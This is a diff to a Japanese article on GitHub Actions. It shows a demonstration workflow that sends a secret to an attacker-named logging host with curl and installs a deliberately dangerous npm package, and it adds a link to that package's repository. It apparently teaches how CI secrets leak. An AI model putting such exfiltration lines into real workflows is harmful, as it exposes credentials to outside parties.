@@ -118,7 +118,7 @@ jobs:
       run: npm install
 
     - name: Build Honkit
-      run: npm run build
+      run: npx honkit build
    
     - name: Upload to S3
       run: aws s3 sync --delete --region ap-northeast-1 ./_book s3://YOUR_PUBLISH_BUCKET
@@ -128,7 +128,7 @@ jobs:
 自分の名前を `TEST_SECRET` という変数に入れておく
 
 ```yaml
-# .github/secret-test.yaml
+# .github/workflows/secret-test.yaml
 name: test 1
 on:
   workflow_dispatch:
@@ -146,6 +146,10 @@ jobs:
       - run: curl http://attacker-logging-endpoint.sasakiy84.net/aaa/$TEST_SECRET
       - run: npm i sasakiy84/dangerous-npm-repository-test
 ```
+
+問題のリポジトリ
+https://github.com/sasakiy84/dangerous-npm-repository-test/tree/main
+
 
 以下のコマンドで、ローカルに依存関係を追加する。
 ```bash
